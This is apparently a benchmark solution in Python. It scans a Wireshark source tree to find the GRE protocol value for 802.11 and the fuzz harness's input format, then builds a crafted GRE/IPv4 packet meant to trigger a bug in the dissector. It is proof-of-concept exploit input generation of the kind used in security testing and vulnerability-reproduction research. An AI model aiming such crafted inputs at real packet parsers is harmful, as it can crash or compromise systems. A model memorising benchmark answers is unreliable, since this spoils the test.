import os
import re
import tarfile
import struct
from typing import Dict, Optional, Tuple, Iterable, List


class _Archive:
    def list_names(self) -> List[str]:
        raise NotImplementedError

    def read_bytes(self, name: str, max_bytes: Optional[int] = None) -> Optional[bytes]:
        raise NotImplementedError

    def iter_names(self) -> Iterable[str]:
        return iter(self.list_names())

    def find_by_basename(self, basename: str) -> Optional[str]:
        bn = basename.lower()
        for n in self.list_names():
            if os.path.basename(n).lower() == bn:
                return n
        return None

    def find_all_by_basename(self, basename: str) -> List[str]:
        bn = basename.lower()
        out = []
        for n in self.list_names():
            if os.path.basename(n).lower() == bn:
                out.append(n)
        return out

    def iter_text_files(self, path_substr: Optional[str] = None, exts: Tuple[str, ...] = (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".in"), max_size: int = 2_000_000) -> Iterable[Tuple[str, bytes]]:
        ps = path_substr.lower() if path_substr else None
        for n in self.iter_names():
            ln = n.lower()
            if ps and ps not in ln:
                continue
            if not any(ln.endswith(e) for e in exts):
                continue
            b = self.read_bytes(n, max_bytes=max_size + 1)
            if not b or len(b) > max_size:
                continue
            yield n, b


class _TarArchive(_Archive):
    def __init__(self, tar_path: str):
        self._tar_path = tar_path
        self._tar = tarfile.open(tar_path, "r:*")
        self._names = []
        self._members: Dict[str, tarfile.TarInfo] = {}
        for m in self._tar.getmembers():
            if not m.isfile():
                continue
            name = m.name
            self._names.append(name)
            self._members[name] = m
        self._cache: Dict[str, bytes] = {}

    def list_names(self) -> List[str]:
        return self._names

    def read_bytes(self, name: str, max_bytes: Optional[int] = None) -> Optional[bytes]:
        if name in self._cache:
            b = self._cache[name]
            if max_bytes is None or len(b) <= max_bytes:
                return b
        m = self._members.get(name)
        if not m:
            return None
        f = self._tar.extractfile(m)
        if not f:
            return None
        if max_bytes is None:
            b = f.read()
        else:
            b = f.read(max_bytes)
        if max_bytes is None or len(b) <= max_bytes:
            if len(b) <= 4_000_000:
                self._cache[name] = b
        return b


class _DirArchive(_Archive):
    def __init__(self, root: str):
        self._root = root
        self._names = []
        for base, _, files in os.walk(root):
            for fn in files:
                full = os.path.join(base, fn)
                rel = os.path.relpath(full, root)
                self._names.append(rel)
        self._cache: Dict[str, bytes] = {}

    def list_names(self) -> List[str]:
        return self._names

    def read_bytes(self, name: str, max_bytes: Optional[int] = None) -> Optional[bytes]:
        if name in self._cache:
            b = self._cache[name]
            if max_bytes is None or len(b) <= max_bytes:
                return b
        full = os.path.join(self._root, name)
        try:
            with open(full, "rb") as f:
                if max_bytes is None:
                    b = f.read()
                else:
                    b = f.read(max_bytes)
        except OSError:
            return None
        if max_bytes is None or len(b) <= max_bytes:
            if len(b) <= 4_000_000:
                self._cache[name] = b
        return b


def _decode(b: bytes) -> str:
    return b.decode("utf-8", errors="ignore")


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*?$", "", s, flags=re.M)
    return s


class _ConstResolver:
    def __init__(self, arch: _Archive):
        self.arch = arch
        self._cache: Dict[str, Optional[int]] = {}
        self._wtap_encap_cache: Optional[Dict[str, int]] = None

    @staticmethod
    def _clean_expr(expr: str) -> str:
        expr = expr.strip()
        expr = _strip_c_comments(expr).strip()
        expr = re.sub(r"\b([0-9]+)[uUlL]+\b", r"\1", expr)
        expr = re.sub(r"\b(0x[0-9a-fA-F]+)[uUlL]+\b", r"\1", expr)
        expr = re.sub(r"\([A-Za-z_][A-Za-z0-9_\s\*]*\)", "", expr).strip()
        expr = expr.strip()
        if expr.startswith("(") and expr.endswith(")"):
            inner = expr[1:-1].strip()
            if inner.count("(") == inner.count(")"):
                expr = inner
        m = re.match(r"^(?:G_GUINT16_CONSTANT|G_GUINT32_CONSTANT|GUINT16_TO_BE|GUINT16_FROM_BE|GUINT32_TO_BE|GUINT32_FROM_BE)\s*\(\s*([^()]*)\s*\)\s*$", expr)
        if m:
            expr = m.group(1).strip()
        return expr

    def _find_definition_in_text(self, name: str, txt: str) -> Optional[str]:
        m = re.search(r"^[ \t]*#[ \t]*define[ \t]+" + re.escape(name) + r"[ \t]+(.+?)\s*$", txt, flags=re.M)
        if m:
            return m.group(1).strip()
        m = re.search(r"^[ \t]*(?:static[ \t]+)?(?:const[ \t]+)?(?:unsigned[ \t]+)?(?:int|long|short|guint16|guint32|guint|uint16_t|uint32_t)[ \t]+" + re.escape(name) + r"[ \t]*=[ \t]*([^;]+);", txt, flags=re.M)
        if m:
            return m.group(1).strip()
        return None

    def _candidate_files_for_name(self, name: str) -> List[str]:
        lname = name.lower()
        candidates = []
        if name.startswith("WTAP_ENCAP_"):
            for bn in ("wtap.h",):
                candidates.extend(self.arch.find_all_by_basename(bn))
            candidates.extend([n for n in self.arch.list_names() if "wiretap" in n.lower() and n.lower().endswith("wtap.h")])
        if name.startswith("ETHERTYPE_") or "ethertype" in lname or "etype" in lname:
            for bn in ("etypes.h", "ethertypes.h"):
                candidates.extend(self.arch.find_all_by_basename(bn))
            candidates.extend([n for n in self.arch.list_names() if "etype" in n.lower() and n.lower().endswith(".h")])
        if name.startswith("GRE_") or "gre" in lname:
            for bn in ("packet-gre.c", "packet-gre.h", "gre.h"):
                p = self.arch.find_by_basename(bn)
                if p:
                    candidates.append(p)
            candidates.extend([n for n in self.arch.list_names() if "gre" in n.lower() and n.lower().endswith((".h", ".c"))])
        if not candidates:
            key = ""
            if "_" in lname:
                parts = lname.split("_")
                key = parts[0]
            if key:
                candidates.extend([n for n in self.arch.list_names() if key in n.lower() and n.lower().endswith((".h", ".c"))])
        seen = set()
        out = []
        for c in candidates:
            if c not in seen:
                out.append(c)
                seen.add(c)
        return out

    def _resolve_expr(self, expr: str, depth: int = 0) -> Optional[int]:
        if depth > 32:
            return None
        expr = self._clean_expr(expr)
        if not expr:
            return None
        if re.fullmatch(r"0x[0-9a-fA-F]+", expr) or re.fullmatch(r"[0-9]+", expr):
            try:
                return int(expr, 0)
            except ValueError:
                return None
        if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", expr):
            return self.resolve(expr)

        tokens = set(re.findall(r"\b[A-Za-z_][A-Za-z0-9_]*\b", expr))
        if tokens:
            for t in sorted(tokens, key=len, reverse=True):
                if t in ("sizeof",):
                    return None
                v = self.resolve(t)
                if v is None:
                    continue
                expr = re.sub(r"\b" + re.escape(t) + r"\b", str(v), expr)

        expr = expr.replace("~", " ^ -1 ^ ") if "~" in expr else expr
        try:
            import ast

            node = ast.parse(expr, mode="eval")

            def ev(n):
                if isinstance(n, ast.Expression):
                    return ev(n.body)
                if isinstance(n, ast.Constant) and isinstance(n.value, (int,)):
                    return int(n.value)
                if hasattr(ast, "Num") and isinstance(n, ast.Num):
                    return int(n.n)
                if isinstance(n, ast.UnaryOp):
                    v = ev(n.operand)
                    if isinstance(n.op, ast.UAdd):
                        return +v
                    if isinstance(n.op, ast.USub):
                        return -v
                    if isinstance(n.op, ast.Invert):
                        return ~v
                    raise ValueError
                if isinstance(n, ast.BinOp):
                    a = ev(n.left)
                    b = ev(n.right)
                    if isinstance(n.op, ast.Add):
                        return a + b
                    if isinstance(n.op, ast.Sub):
                        return a - b
                    if isinstance(n.op, ast.Mult):
                        return a * b
                    if isinstance(n.op, ast.FloorDiv) or isinstance(n.op, ast.Div):
                        if b == 0:
                            return 0
                        return a // b
                    if isinstance(n.op, ast.Mod):
                        if b == 0:
                            return 0
                        return a % b
                    if isinstance(n.op, ast.BitOr):
                        return a | b
                    if isinstance(n.op, ast.BitAnd):
                        return a & b
                    if isinstance(n.op, ast.BitXor):
                        return a ^ b
                    if isinstance(n.op, ast.LShift):
                        return a << b
                    if isinstance(n.op, ast.RShift):
                        return a >> b
                    raise ValueError
                if isinstance(n, ast.Paren) if hasattr(ast, "Paren") else False:
                    return ev(n.value)
                raise ValueError

            return ev(node)
        except Exception:
            return None

    def _build_wtap_encap_map(self) -> Dict[str, int]:
        if self._wtap_encap_cache is not None:
            return self._wtap_encap_cache
        wtap = self.arch.find_by_basename("wtap.h")
        if not wtap:
            for n in self.arch.list_names():
                if n.lower().endswith("wtap.h"):
                    wtap = n
                    break
        m: Dict[str, int] = {}
        if not wtap:
            self._wtap_encap_cache = m
            return m
        b = self.arch.read_bytes(wtap, max_bytes=4_000_000)
        if not b:
            self._wtap_encap_cache = m
            return m
        txt = _strip_c_comments(_decode(b))
        idx = txt.find("WTAP_ENCAP_UNKNOWN")
        if idx < 0:
            self._wtap_encap_cache = m
            return m
        start = txt.rfind("{", 0, idx)
        end = txt.find("}", idx)
        if start < 0 or end < 0 or end <= start:
            self._wtap_encap_cache = m
            return m
        body = txt[start + 1 : end]
        entries = [e.strip() for e in body.split(",")]
        cur = -1
        for e in entries:
            if not e:
                continue
            if e.startswith("#"):
                continue
            e = e.strip()
            if not e or not re.match(r"^[A-Za-z_][A-Za-z0-9_]*", e):
                continue
            if "=" in e:
                name, rhs = e.split("=", 1)
                name = name.strip()
                rhs = rhs.strip()
                val = self._resolve_expr(rhs)
                if val is None:
                    continue
                cur = int(val)
                m[name] = cur
            else:
                name = e.strip()
                cur = cur + 1
                m[name] = cur
        self._wtap_encap_cache = m
        return m

    def resolve(self, name: str) -> Optional[int]:
        if name in self._cache:
            return self._cache[name]
        if name.startswith("WTAP_ENCAP_"):
            mp = self._build_wtap_encap_map()
            if name in mp:
                self._cache[name] = mp[name]
                return mp[name]
        candidates = self._candidate_files_for_name(name)
        expr = None
        for fn in candidates:
            b = self.arch.read_bytes(fn, max_bytes=2_000_000)
            if not b:
                continue
            if name.encode() not in b:
                continue
            txt = _decode(b)
            found = self._find_definition_in_text(name, txt)
            if found:
                expr = found
                break
        if expr is None:
            for fn, b in self.arch.iter_text_files(max_size=512_000):
                if name.encode() not in b:
                    continue
                txt = _decode(b)
                found = self._find_definition_in_text(name, txt)
                if found:
                    expr = found
                    break
        if expr is None:
            self._cache[name] = None
            return None
        val = self._resolve_expr(expr)
        self._cache[name] = val
        return val


def _extract_gre_proto_for_wlan(arch: _Archive, resolver: _ConstResolver) -> int:
    gre_path = arch.find_by_basename("packet-gre.c")
    gre_txt = None
    if gre_path:
        b = arch.read_bytes(gre_path, max_bytes=4_000_000)
        if b:
            gre_txt = _decode(b)
    if gre_txt is None:
        for fn, b in arch.iter_text_files(path_substr="gre", max_size=2_000_000):
            if b'"gre.proto"' in b and b"dissector_add_uint" in b:
                gre_txt = _decode(b)
                break
    if gre_txt is None:
        return 0x0087

    txt = _strip_c_comments(gre_txt)
    handles = set()
    for m in re.finditer(r'\b([A-Za-z_][A-Za-z0-9_]*)\s*=\s*find_dissector(?:_add_dependency)?\s*\(\s*"([^"]+)"\s*\)', txt):
        var = m.group(1)
        dname = m.group(2).lower()
        if "wlan" in dname or "ieee80211" in dname or "80211" in dname or "802_11" in dname:
            handles.add(var)

    proto_token = None
    for m in re.finditer(r'\bdissector_add_uint\w*\s*\(\s*"gre\.proto"\s*,\s*([^,]+)\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', txt):
        tok = m.group(1).strip()
        h = m.group(2).strip()
        if h in handles:
            proto_token = tok
            break

    if proto_token is None:
        for m in re.finditer(r'\bdissector_add_uint\w*\s*\(\s*"gre\.proto"\s*,\s*([^,]+)\s*,\s*([^)]+)\)', txt):
            tok = m.group(1).strip()
            rest = m.group(2).strip().lower()
            line = (tok + " " + rest)
            if ("802" in line) or ("wlan" in line) or ("ieee" in line):
                proto_token = tok
                break

    if proto_token is None:
        mm = re.search(r'gre\.proto"\s*,\s*(0x[0-9a-fA-F]+|\d+)\s*,\s*[^)]*(?:wlan|802|ieee)', txt, flags=re.I)
        if mm:
            proto_token = mm.group(1)

    if proto_token is None:
        return 0x0087

    proto_token = proto_token.strip()
    proto_token = re.sub(r"^\(+", "", proto_token)
    proto_token = re.sub(r"\)+$", "", proto_token).strip()
    proto_token = re.sub(r"\([A-Za-z_][A-Za-z0-9_\s\*]*\)", "", proto_token).strip()

    if re.fullmatch(r"(?:0x[0-9a-fA-F]+|\d+)", proto_token):
        try:
            return int(proto_token, 0) & 0xFFFF
        except ValueError:
            return 0x0087

    val = resolver.resolve(proto_token)
    if val is None:
        val = resolver._resolve_expr(proto_token)
    if val is None:
        return 0x0087
    return int(val) & 0xFFFF


def _ipv4_checksum(hdr20: bytes) -> int:
    if len(hdr20) != 20:
        return 0
    s = 0
    for i in range(0, 20, 2):
        w = (hdr20[i] << 8) | hdr20[i + 1]
        s += w
        s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _ieee80211_data_frame_24() -> bytes:
    fc = b"\x08\x00"
    dur = b"\x00\x00"
    a1 = b"\xff\xff\xff\xff\xff\xff"
    a2 = b"\x00\x11\x22\x33\x44\x55"
    a3 = b"\x66\x77\x88\x99\xaa\xbb"
    seq = b"\x00\x00"
    return fc + dur + a1 + a2 + a3 + seq


def _build_gre_packet(proto: int, payload: bytes, flags_ver: int = 0) -> bytes:
    return struct.pack("!HH", flags_ver & 0xFFFF, proto & 0xFFFF) + payload


def _build_ipv4_packet(payload: bytes, proto: int = 47) -> bytes:
    ver_ihl = 0x45
    tos = 0
    total_len = 20 + len(payload)
    ident = 0
    flags_frag = 0
    ttl = 64
    protocol = proto & 0xFF
    chksum = 0
    src = b"\x01\x02\x03\x04"
    dst = b"\x05\x06\x07\x08"
    hdr = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_len, ident, flags_frag, ttl, protocol, chksum, src, dst)
    c = _ipv4_checksum(hdr)
    hdr = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_len, ident, flags_frag, ttl, protocol, c, src, dst)
    return hdr + payload


def _build_ethernet_ipv4_frame(ip_packet: bytes) -> bytes:
    dst = b"\x00\x00\x00\x00\x00\x00"
    src = b"\x00\x00\x00\x00\x00\x00"
    ethertype = b"\x08\x00"
    return dst + src + ethertype + ip_packet


def _detect_fuzzer_entry_and_prefix(arch: _Archive, resolver: _ConstResolver) -> Tuple[str, bytes]:
    best = None
    best_txt = ""
    best_score = -1
    for fn, b in arch.iter_text_files(path_substr="fuzz", max_size=1_500_000):
        if b"LLVMFuzzerTestOneInput" not in b:
            continue
        txt = _decode(b)
        ltxt = txt.lower()
        score = 0
        lfn = fn.lower()
        if "gre" in lfn or "packet-gre" in lfn:
            score += 8
        if "wlan" in lfn or "802" in lfn:
            score += 4
        if "gre" in ltxt:
            score += 2
        if 'fuzz_init_dissector("gre"' in ltxt or 'find_dissector("gre"' in ltxt:
            score += 10
        if 'fuzz_init_dissector("ip"' in ltxt or 'find_dissector("ip"' in ltxt:
            score += 6
        if "wtap_encap" in ltxt and ("pletoh32" in ltxt or "pntoh32" in ltxt):
            score += 5
        if score > best_score:
            best_score = score
            best = fn
            best_txt = txt

    if best is None:
        return "gre", b""

    ltxt = best_txt.lower()

    # Detect "encap prefix" formats (4 or 8 bytes) seen in dissector fuzz harnesses.
    # If present, assume we need to drive parsing from encapsulation (use RAW_IP if available, else ETHERNET).
    prefix_len = 0
    endian = None  # "<" or "!"
    if "pletoh32" in ltxt:
        endian = "<"
    elif "pntoh32" in ltxt or "g_ntohl" in ltxt:
        endian = "!"
    if endian and re.search(r"\bencap\b", ltxt) and re.search(r"pletoh32\s*\(\s*data\s*\)|pntoh32\s*\(\s*data\s*\)|g_ntohl\s*\(\s*\*\s*\(\s*guint32\s*\*\s*\)\s*data\s*\)", ltxt):
        if re.search(r"data\s*\+\s*4", ltxt) and (re.search(r"size\s*<\s*8", ltxt) or re.search(r"data\s*\+\=\s*8", ltxt)):
            prefix_len = 8
        else:
            prefix_len = 4

    # Determine starting dissector when not driven by prefix.
    start = "gre"
    if 'fuzz_init_dissector("ip"' in ltxt or 'find_dissector("ip"' in ltxt or 'dissect_ip' in ltxt:
        start = "ip"
    if 'fuzz_init_dissector("gre"' in ltxt or 'find_dissector("gre"' in ltxt or 'dissect_gre' in ltxt:
        start = "gre"

    if prefix_len == 0:
        return start, b""

    encap = resolver.resolve("WTAP_ENCAP_RAW_IP")
    if encap is None:
        encap = resolver.resolve("WTAP_ENCAP_IP")
    if encap is None:
        encap = resolver.resolve("WTAP_ENCAP_ETHERNET")
    if encap is None:
        encap = 1

    if prefix_len == 4:
        pref = struct.pack(endian + "I", int(encap) & 0xFFFFFFFF)
    else:
        pref = struct.pack(endian + "I", int(encap) & 0xFFFFFFFF) + struct.pack(endian + "I", 0)
    return "encap", pref


class Solution:
    def solve(self, src_path: str) -> bytes:
        if os.path.isdir(src_path):
            arch: _Archive = _DirArchive(src_path)
        else:
            arch = _TarArchive(src_path)

        resolver = _ConstResolver(arch)
        gre_proto = _extract_gre_proto_for_wlan(arch, resolver)

        entry, prefix = _detect_fuzzer_entry_and_prefix(arch, resolver)

        wlan_payload = _ieee80211_data_frame_24()
        gre_payload = _build_gre_packet(gre_proto, wlan_payload, flags_ver=0)

        if entry == "gre":
            return prefix + gre_payload

        ip_pkt = _build_ipv4_packet(gre_payload, proto=47)

        if entry == "encap":
            encap_val = None
            if len(prefix) >= 4:
                if prefix[:4] == struct.pack("<I", struct.unpack("<I", prefix[:4])[0]):
                    encap_val = struct.unpack("<I", prefix[:4])[0]
                else:
                    encap_val = struct.unpack("!I", prefix[:4])[0]
            if encap_val is not None:
                eth_encap = resolver.resolve("WTAP_ENCAP_ETHERNET")
                if eth_encap is None:
                    eth_encap = 1
                raw_ip_encap = resolver.resolve("WTAP_ENCAP_RAW_IP")
                if raw_ip_encap is None:
                    raw_ip_encap = resolver.resolve("WTAP_ENCAP_IP")
                if raw_ip_encap is not None and int(encap_val) == int(raw_ip_encap):
                    return prefix + ip_pkt
                if int(encap_val) == int(eth_encap):
                    return prefix + _build_ethernet_ipv4_frame(ip_pkt)
            return prefix + ip_pkt

        if entry == "ip":
            return prefix + ip_pkt

        return prefix + gre_payload